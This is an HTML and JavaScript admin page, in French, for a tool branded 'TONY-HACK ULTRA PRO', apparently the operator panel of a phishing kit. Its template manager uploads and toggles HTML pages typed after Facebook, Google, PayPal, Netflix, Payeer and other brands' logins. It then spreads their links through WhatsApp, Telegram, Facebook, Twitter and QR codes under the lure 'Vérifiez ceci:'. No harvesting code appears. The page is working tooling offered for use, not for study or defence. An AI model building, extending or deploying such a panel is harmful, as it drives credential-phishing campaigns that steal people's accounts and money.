<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TONY-HACK | Templates ULTRA</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "Inter", sans-serif; background: #0a0e14; color: #e0e0e0; }
        .app { display: flex; min-height: 100vh; }
        
        .sidebar {
            width: 300px; background: linear-gradient(180deg, #1a1f2a 0%, #0f1419 100%);
            border-right: 1px solid #2a3342; position: fixed; top: 0; left: 0; bottom: 0;
            display: flex; flex-direction: column; padding: 24px 20px; overflow-y: auto;
        }
        .logo h2 { font-size: 24px; font-weight: 700; background: linear-gradient(135deg, #e94560, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .logo p { color: #6b7a8f; font-size: 11px; margin-top: 4px; }
        .version-tag { display: inline-block; background: #e94560; color: white; font-size: 10px; padding: 2px 8px; border-radius: 10px; margin-top: 6px; }
        .user-profile { display: flex; align-items: center; gap: 14px; padding: 20px 0; border-bottom: 1px solid #2a3342; }
        .avatar { width: 48px; height: 48px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 18px; color: white; background-size: cover; }
        .user-info h4 { font-size: 15px; font-weight: 600; }
        .user-info p { font-size: 12px; color: #e94560; }
        .sidebar-nav { flex: 1; padding: 24px 0; }
        .nav-item { display: flex; align-items: center; gap: 14px; padding: 14px 18px; color: #8a9ab0; text-decoration: none; border-radius: 12px; margin-bottom: 6px; transition: all 0.3s; }
        .nav-item i { width: 26px; font-size: 20px; }
        .nav-item:hover { background: #2a3342; color: white; }
        .nav-item.active { background: #e94560; color: white; }
        .nav-divider { margin: 20px 0; border-top: 1px solid #2a3342; }
        
        .main-content { flex: 1; margin-left: 300px; padding: 32px 40px; }
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; }
        .header h1 { font-size: 32px; font-weight: 700; color: white; }
        .header h1 i { color: #e94560; margin-right: 12px; }
        
        .btn-primary {
            background: linear-gradient(135deg, #e94560, #ff6b6b); color: white;
            border: none; padding: 14px 28px; border-radius: 12px;
            font-weight: 600; font-size: 15px; cursor: pointer;
            display: flex; align-items: center; gap: 10px; transition: all 0.3s;
        }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(233,69,96,0.3); }
        
        .templates-grid {
            display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 24px;
        }
        .template-card {
            background: #1a1f2a; border: 1px solid #2a3342;
            border-radius: 20px; overflow: hidden; transition: all 0.3s;
        }
        .template-card:hover { border-color: #e94560; transform: translateY(-4px); }
        
        .template-preview {
            height: 160px; display: flex; align-items: center; justify-content: center;
            position: relative; transition: background 0.3s;
        }
        .template-preview i { font-size: 56px; color: white; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
        .template-badge {
            position: absolute; top: 12px; right: 12px;
            padding: 6px 14px; border-radius: 30px; font-size: 12px; font-weight: 700; color: white;
            text-transform: uppercase; letter-spacing: 0.5px;
        }
        .badge-facebook { background: #1877f2; }
        .badge-google { background: #ea4335; }
        .badge-instagram { background: #e4405f; }
        .badge-linkedin { background: #0a66c2; }
        .badge-twitter { background: #000; }
        .badge-netflix { background: #e50914; }
        .badge-paypal { background: #003087; }
        .badge-airtm { background: #0088ff; }
        .badge-alibaba { background: #ff6a00; }
        .badge-payeer { background: #1e3c72; }
        .badge-custom { background: #e94560; }
        
        .template-info { padding: 20px; }
        .template-name {
            display: flex; align-items: center; justify-content: space-between;
            font-size: 18px; font-weight: 700; color: white; margin-bottom: 6px;
        }
        .template-name span { display: flex; align-items: center; gap: 8px; }
        .template-type-badge {
            padding: 3px 10px; border-radius: 20px; font-size: 10px;
            font-weight: 600; text-transform: uppercase; background: #2a3342; color: #8a9ab0;
        }
        .template-id { font-size: 11px; color: #6b7a8f; font-family: monospace; margin-bottom: 12px; }
        .template-url {
            background: #0f1419; padding: 12px; border-radius: 10px;
            font-size: 12px; font-family: monospace; color: #e94560;
            margin-bottom: 16px; word-break: break-all; border: 1px solid #2a3342;
        }
        
        .template-actions { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 12px; }
        .template-actions button {
            flex: 1; padding: 10px; border: none; border-radius: 10px;
            font-size: 12px; font-weight: 600; cursor: pointer; display: flex;
            align-items: center; justify-content: center; gap: 6px; transition: all 0.2s;
        }
        .btn-copy { background: #3b82f6; color: white; }
        .btn-copy:hover { background: #2563eb; }
        .btn-qr { background: #8b5cf6; color: white; }
        .btn-qr:hover { background: #7c3aed; }
        .btn-preview { background: #10b981; color: white; }
        .btn-preview:hover { background: #059669; }
        .btn-edit { background: #f59e0b; color: white; }
        .btn-edit:hover { background: #d97706; }
        .btn-toggle { background: #6366f1; color: white; }
        .btn-toggle:hover { background: #4f46e5; }
        .btn-delete { background: #ef4444; color: white; }
        .btn-delete:hover { background: #dc2626; }
        
        .share-buttons { display: flex; gap: 8px; margin-top: 8px; }
        .share-btn {
            flex: 1; padding: 8px; border: none; border-radius: 8px;
            font-size: 11px; font-weight: 500; cursor: pointer; display: flex;
            align-items: center; justify-content: center; gap: 6px;
            transition: all 0.2s; color: white;
        }
        .share-fb { background: #1877f2; }
        .share-fb:hover { background: #0d6efd; }
        .share-wa { background: #25d366; }
        .share-wa:hover { background: #20bd5a; }
        .share-tw { background: #1da1f2; }
        .share-tw:hover { background: #0c85d0; }
        .share-tg { background: #26a5e4; }
        .share-tg:hover { background: #1e96c7; }
        
        .upload-card {
            border: 2px dashed #2a3342; background: transparent;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; cursor: pointer; min-height: 380px;
        }
        .upload-card:hover { border-color: #e94560; background: rgba(233,69,96,0.05); }
        .upload-card i { font-size: 48px; color: #6b7a8f; margin-bottom: 16px; }
        .upload-card p { color: #8a9ab0; font-size: 14px; }
        
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); backdrop-filter: blur(4px);
            display: none; align-items: center; justify-content: center; z-index: 1000;
        }
        .modal {
            background: #1a1f2a; border: 2px solid #e94560; border-radius: 24px;
            padding: 32px; width: 90%; max-width: 500px; max-height: 90vh; overflow-y: auto;
        }
        .modal-header {
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 24px;
        }
        .modal-header h2 { color: white; font-size: 22px; }
        .modal-close {
            width: 36px; height: 36px; background: #2a3342;
            border: none; border-radius: 10px; color: #8a9ab0;
            font-size: 20px; cursor: pointer; transition: all 0.2s;
        }
        .modal-close:hover { background: #ef4444; color: white; }
        
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; color: #8a9ab0; font-size: 13px; margin-bottom: 8px; }
        .form-group input, .form-group select {
            width: 100%; padding: 12px 16px; background: #0f1419;
            border: 1px solid #2a3342; border-radius: 10px; color: white; font-size: 14px;
        }
        
        .qr-container { text-align: center; padding: 20px; }
        .qr-container img { width: 200px; height: 200px; background: white; padding: 15px; border-radius: 16px; }
        .qr-actions { display: flex; gap: 10px; margin-top: 20px; }
        
        .toast {
            position: fixed; bottom: 24px; right: 24px; background: #1a1f2a;
            border: 1px solid #e94560; border-radius: 12px; padding: 16px 20px;
            color: white; display: none; align-items: center; gap: 12px; z-index: 9999;
        }
        .toast.show { display: flex; }
        .toast i { color: #10b981; }
    </style>
</head>
<body>
    <div class="app">
        <aside class="sidebar">
            <div class="logo"><h2>🔴 TONY-HACK</h2><p>ULTRA PRO v4.0</p><span class="version-tag">ENTERPRISE</span></div>
            <div class="user-profile">
                <div class="avatar" id="sidebarAvatar">A</div>
                <div class="user-info"><h4 id="sidebarName">Admin</h4><p>Super Admin</p></div>
            </div>
            <nav class="sidebar-nav">
                <a href="/" class="nav-item"><i class="fas fa-home"></i> Dashboard</a>
                <a href="/campaigns" class="nav-item"><i class="fas fa-bullseye"></i> Campagne Optimiser</a>
                <a href="/builder" class="nav-item"><i class="fas fa-code"></i> Code Editor</a>
                <a href="/templates" class="nav-item active"><i class="fas fa-file-code"></i> Templates</a>
                <a href="/statistics" class="nav-item"><i class="fas fa-chart-bar"></i> Statistiques</a>
                <a href="/logs" class="nav-item"><i class="fas fa-history"></i> Logs</a>
                <div class="nav-divider"></div>
                <a href="/settings" class="nav-item"><i class="fas fa-cog"></i> Paramètres</a>
                <a href="/profile" class="nav-item"><i class="fas fa-user"></i> Profil</a>
                <a href="#" class="nav-item" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Déconnexion</a>
            </nav>
        </aside>
        
        <main class="main-content">
            <header class="header">
                <h1><i class="fas fa-file-code"></i> Gestion des Templates ULTRA</h1>
                <button class="btn-primary" id="uploadBtn"><i class="fas fa-upload"></i> Upload Template</button>
            </header>
            
            <div class="templates-grid" id="templatesGrid"></div>
        </main>
    </div>
    
    <!-- Modal Upload -->
    <div class="modal-overlay" id="uploadModal">
        <div class="modal">
            <div class="modal-header">
                <h2><i class="fas fa-upload" style="color:#e94560;"></i> Upload Template</h2>
                <button class="modal-close" onclick="closeUploadModal()">&times;</button>
            </div>
            <form id="uploadForm">
                <div class="form-group"><label>Nom du template</label><input type="text" id="templateName" placeholder="Ex: Facebook Login" required></div>
                <div class="form-group"><label>Type</label><select id="templateType"><option value="facebook">Facebook</option><option value="google">Google</option><option value="instagram">Instagram</option><option value="linkedin">LinkedIn</option><option value="twitter">Twitter/X</option><option value="netflix">Netflix</option><option value="paypal">PayPal</option><option value="airtm">Airtm</option><option value="alibaba">Alibaba</option><option value="payeer">Payeer</option><option value="custom">Personnalisé</option></select></div>
                <div class="form-group"><label>Couleur</label><input type="color" id="templateColor" value="#e94560"></div>
                <div class="form-group"><label>Fichier HTML</label><input type="file" id="templateFile" accept=".html" required></div>
                <button type="submit" class="btn-primary" style="width:100%;">Uploader</button>
            </form>
        </div>
    </div>
    
    <!-- Modal Édition -->
    <div class="modal-overlay" id="editModal">
        <div class="modal">
            <div class="modal-header">
                <h2><i class="fas fa-edit" style="color:#e94560;"></i> Modifier Template</h2>
                <button class="modal-close" onclick="closeEditModal()">&times;</button>
            </div>
            <form id="editForm">
                <input type="hidden" id="editTemplateId">
                <div class="form-group"><label>Nom</label><input type="text" id="editTemplateName" required></div>
                <div class="form-group"><label>Type</label><select id="editTemplateType"><option value="facebook">Facebook</option><option value="google">Google</option><option value="instagram">Instagram</option><option value="linkedin">LinkedIn</option><option value="twitter">Twitter/X</option><option value="netflix">Netflix</option><option value="paypal">PayPal</option><option value="airtm">Airtm</option><option value="alibaba">Alibaba</option><option value="payeer">Payeer</option><option value="custom">Personnalisé</option></select></div>
                <div class="form-group"><label>Couleur</label><input type="color" id="editTemplateColor" value="#e94560"></div>
                <button type="submit" class="btn-primary" style="width:100%;">Enregistrer</button>
            </form>
        </div>
    </div>
    
    <!-- Modal QR -->
    <div class="modal-overlay" id="qrModal">
        <div class="modal">
            <div class="modal-header">
                <h2><i class="fas fa-qrcode" style="color:#e94560;"></i> QR Code</h2>
                <button class="modal-close" onclick="closeQrModal()">&times;</button>
            </div>
            <div class="qr-container">
                <img id="qrImage" src="" alt="QR Code">
                <p id="qrUrlText" style="color:#8a9ab0; margin:16px 0; word-break:break-all;"></p>
                <div class="qr-actions">
                    <button class="btn-copy" onclick="copyQrUrl()"><i class="fas fa-copy"></i> Copier URL</button>
                    <button class="btn-primary" onclick="downloadQr()"><i class="fas fa-download"></i> Télécharger</button>
                </div>
                <div class="share-buttons" style="margin-top:16px;">
                    <button class="share-btn share-fb" id="shareFbBtn"><i class="fab fa-facebook-f"></i> Facebook</button>
                    <button class="share-btn share-wa" id="shareWaBtn"><i class="fab fa-whatsapp"></i> WhatsApp</button>
                    <button class="share-btn share-tw" id="shareTwBtn"><i class="fab fa-twitter"></i> Twitter</button>
                    <button class="share-btn share-tg" id="shareTgBtn"><i class="fab fa-telegram"></i> Telegram</button>
                </div>
            </div>
        </div>
    </div>
    
    <div class="toast" id="toast"><i class="fas fa-check-circle"></i><span id="toastMsg"></span></div>
    
    <script>
        let templates = [];
        let currentQrUrl = '';
        
        fetch('/api/profile').then(r=>r.json()).then(d=>{
            if(d.avatar) document.getElementById('sidebarAvatar').style.backgroundImage = `url(${d.avatar})`;
            document.getElementById('sidebarName').textContent = d.username || 'Admin';
        });
        
        async function loadTemplates() {
            const r = await fetch('/api/templates/list');
            templates = await r.json();
            renderTemplates();
        }
        
        function getBadgeClass(type) {
            const classes = {facebook:'badge-facebook', google:'badge-google', instagram:'badge-instagram', linkedin:'badge-linkedin', twitter:'badge-twitter', netflix:'badge-netflix', paypal:'badge-paypal', airtm:'badge-airtm', alibaba:'badge-alibaba', payeer:'badge-payeer'};
            return classes[type] || 'badge-custom';
        }
        
        function renderTemplates() {
            const grid = document.getElementById('templatesGrid');
            if (templates.length === 0) {
                grid.innerHTML = `<div class="template-card upload-card" onclick="openUploadModal()"><i class="fas fa-plus-circle"></i><p>Uploader un template</p></div>`;
                return;
            }
            
            let html = templates.map(t => {
                const badgeClass = getBadgeClass(t.type);
                const bgColor = t.color || '#e94560';
                
                return `
                    <div class="template-card">
                        <div class="template-preview" style="background: ${bgColor};">
                            <i class="fab fa-${t.type === 'facebook' ? 'facebook' : t.type === 'google' ? 'google' : t.type === 'instagram' ? 'instagram' : t.type === 'linkedin' ? 'linkedin' : t.type === 'twitter' ? 'twitter' : 'code'}"></i>
                            <span class="template-badge ${badgeClass}">${t.active ? 'ACTIF' : 'INACTIF'}</span>
                        </div>
                        <div class="template-info">
                            <div class="template-name">
                                <span>${t.name || t.id}</span>
                                <span class="template-type-badge">${t.type}</span>
                            </div>
                            <div class="template-id">ID: ${t.id}</div>
                            <div class="template-url">${t.url}</div>
                            <div class="template-actions">
                                <button class="btn-copy" onclick="copyUrl('${t.url}')"><i class="fas fa-copy"></i> Copier</button>
                                <button class="btn-qr" onclick="showQr('${t.url}')"><i class="fas fa-qrcode"></i> QR</button>
                                <button class="btn-preview" onclick="window.open('${t.url}','_blank')"><i class="fas fa-eye"></i> Voir</button>
                            </div>
                            <div class="template-actions">
                                <button class="btn-edit" onclick="openEditModal('${t.id}', '${t.name}', '${t.type}', '${t.color || '#e94560'}')"><i class="fas fa-edit"></i></button>
                                <button class="btn-toggle" onclick="toggleTemplate('${t.id}')"><i class="fas fa-power-off"></i> ${t.active ? 'Off' : 'On'}</button>
                                <button class="btn-delete" onclick="deleteTemplate('${t.id}')"><i class="fas fa-trash"></i></button>
                            </div>
                            <div class="share-buttons">
                                <button class="share-btn share-fb" onclick="shareUrl('fb', '${t.url}')"><i class="fab fa-facebook-f"></i></button>
                                <button class="share-btn share-wa" onclick="shareUrl('wa', '${t.url}')"><i class="fab fa-whatsapp"></i></button>
                                <button class="share-btn share-tw" onclick="shareUrl('tw', '${t.url}')"><i class="fab fa-twitter"></i></button>
                                <button class="share-btn share-tg" onclick="shareUrl('tg', '${t.url}')"><i class="fab fa-telegram"></i></button>
                            </div>
                        </div>
                    </div>
                `;
            }).join('');
            
            html += `<div class="template-card upload-card" onclick="openUploadModal()"><i class="fas fa-plus-circle"></i><p>Nouveau template</p></div>`;
            grid.innerHTML = html;
        }
        
        function shareUrl(platform, url) {
            const text = encodeURIComponent('Vérifiez ceci:');
            const urls = {
                fb: `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`,
                wa: `https://api.whatsapp.com/send?text=${text}%20${encodeURIComponent(url)}`,
                tw: `https://twitter.com/intent/tweet?url=${encodeURIComponent(url)}&text=${text}`,
                tg: `https://t.me/share/url?url=${encodeURIComponent(url)}&text=${text}`
            };
            window.open(urls[platform], '_blank', 'width=600,height=400');
        }
        
        function copyUrl(url) { navigator.clipboard?.writeText(url); showToast('✅ URL copiée !'); }
        
        function showQr(url) {
            currentQrUrl = url;
            document.getElementById('qrImage').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
            document.getElementById('qrUrlText').textContent = url;
            document.getElementById('qrModal').style.display = 'flex';
            
            document.getElementById('shareFbBtn').onclick = () => shareUrl('fb', url);
            document.getElementById('shareWaBtn').onclick = () => shareUrl('wa', url);
            document.getElementById('shareTwBtn').onclick = () => shareUrl('tw', url);
            document.getElementById('shareTgBtn').onclick = () => shareUrl('tg', url);
        }
        
        function closeQrModal() { document.getElementById('qrModal').style.display = 'none'; }
        function copyQrUrl() { navigator.clipboard?.writeText(currentQrUrl); showToast('✅ URL copiée !'); }
        function downloadQr() {
            const link = document.createElement('a');
            link.href = document.getElementById('qrImage').src;
            link.download = 'qrcode.png';
            link.click();
        }
        
        async function toggleTemplate(id) {
            await fetch(`/api/templates/${id}/toggle`, {method:'POST'});
            loadTemplates();
        }
        
        async function deleteTemplate(id) {
            if (!confirm('Supprimer ce template ?')) return;
            await fetch(`/api/templates/${id}`, {method:'DELETE'});
            loadTemplates();
            showToast('✅ Template supprimé');
        }
        
        function openUploadModal() { document.getElementById('uploadModal').style.display = 'flex'; }
        function closeUploadModal() { document.getElementById('uploadModal').style.display = 'none'; }
        
        function openEditModal(id, name, type, color) {
            document.getElementById('editTemplateId').value = id;
            document.getElementById('editTemplateName').value = name;
            document.getElementById('editTemplateType').value = type;
            document.getElementById('editTemplateColor').value = color || '#e94560';
            document.getElementById('editModal').style.display = 'flex';
        }
        function closeEditModal() { document.getElementById('editModal').style.display = 'none'; }
        
        document.getElementById('uploadForm').addEventListener('submit', async e => {
            e.preventDefault();
            const file = document.getElementById('templateFile').files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('file', file);
            formData.append('name', document.getElementById('templateName').value);
            formData.append('type', document.getElementById('templateType').value);
            formData.append('color', document.getElementById('templateColor').value);
            
            const r = await fetch('/api/templates/upload', {method:'POST', body:formData});
            const d = await r.json();
            if (d.success) { closeUploadModal(); loadTemplates(); showToast('✅ Template uploadé !'); document.getElementById('uploadForm').reset(); }
        });
        
        document.getElementById('editForm').addEventListener('submit', async e => {
            e.preventDefault();
            const id = document.getElementById('editTemplateId').value;
            const name = document.getElementById('editTemplateName').value;
            const type = document.getElementById('editTemplateType').value;
            const color = document.getElementById('editTemplateColor').value;
            
            await fetch(`/api/templates/${id}/update`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({name, type, color})});
            closeEditModal(); loadTemplates(); showToast('✅ Template mis à jour !');
        });
        
        function showToast(msg) {
            const t = document.getElementById('toast');
            document.getElementById('toastMsg').textContent = msg;
            t.classList.add('show');
            setTimeout(() => t.classList.remove('show'), 3000);
        }
        
        document.getElementById('uploadBtn').addEventListener('click', openUploadModal);
        document.getElementById('logoutBtn').addEventListener('click', e => {
            e.preventDefault();
            if (confirm('Voulez-vous vous déconnecter ?')) window.location.href = '/logout';
        });
        
        loadTemplates();
    </script>
</body>
</html>
